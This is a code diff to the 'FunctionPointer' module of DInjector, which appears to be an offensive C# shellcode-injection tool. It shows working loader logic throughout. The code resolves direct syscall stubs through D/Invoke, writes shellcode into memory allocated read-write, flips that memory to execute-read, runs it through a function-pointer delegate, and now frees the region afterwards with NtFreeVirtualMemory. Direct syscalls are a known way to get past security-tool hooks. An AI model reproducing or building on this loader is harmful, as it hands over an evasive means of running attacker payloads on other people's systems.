@@ -28,6 +28,13 @@ namespace DInjector
         [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         delegate void pFunction();
 
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        delegate DI.Data.Native.NTSTATUS NtFreeVirtualMemory(
+            IntPtr processHandle,
+            ref IntPtr baseAddress,
+            ref IntPtr regionSize,
+            uint freeType);
+
         public static void Execute(byte[] shellcodeBytes)
         {
             var shellcode = shellcodeBytes;
@@ -50,13 +57,9 @@ namespace DInjector
                 DI.Data.Win32.WinNT.PAGE_READWRITE);
 
             if (ntstatus == 0)
-            {
                 Console.WriteLine("(FunctionPointer) [+] NtAllocateVirtualMemory, PAGE_READWRITE");
-            }
             else
-            {
                 Console.WriteLine($"(FunctionPointer) [-] NtAllocateVirtualMemory, PAGE_READWRITE: {ntstatus}");
-            }
 
             Marshal.Copy(shellcode, 0, baseAddress, shellcode.Length);
 
@@ -75,16 +78,32 @@ namespace DInjector
                 out uint _);
 
             if (ntstatus == 0)
-            {
-                Console.WriteLine("(CurrentThread) [+] NtProtectVirtualMemory, PAGE_EXECUTE_READ");
-            }
+                Console.WriteLine("(FunctionPointer) [+] NtProtectVirtualMemory, PAGE_EXECUTE_READ");
             else
-            {
-                Console.WriteLine($"(CurrentThread) [-] NtProtectVirtualMemory, PAGE_EXECUTE_READ: {ntstatus}");
-            }
+                Console.WriteLine($"(FunctionPointer) [-] NtProtectVirtualMemory, PAGE_EXECUTE_READ: {ntstatus}");
 
             pFunction f = (pFunction)Marshal.GetDelegateForFunctionPointer(baseAddress, typeof(pFunction));
             f();
+
+            #endregion
+
+            #region NtFreeVirtualMemory (shellcode)
+
+            stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtFreeVirtualMemory");
+            NtFreeVirtualMemory sysNtFreeVirtualMemory = (NtFreeVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtFreeVirtualMemory));
+
+            regionSize = IntPtr.Zero;
+
+            ntstatus = sysNtFreeVirtualMemory(
+                Process.GetCurrentProcess().Handle,
+                ref baseAddress,
+                ref regionSize,
+                DI.Data.Win32.Kernel32.MEM_RELEASE);
+
+            if (ntstatus == 0)
+                Console.WriteLine("(FunctionPointer) [+] NtFreeVirtualMemory");
+            else
+                Console.WriteLine($"(FunctionPointer) [-] NtFreeVirtualMemory: {ntstatus}");
 
             #endregion
         }
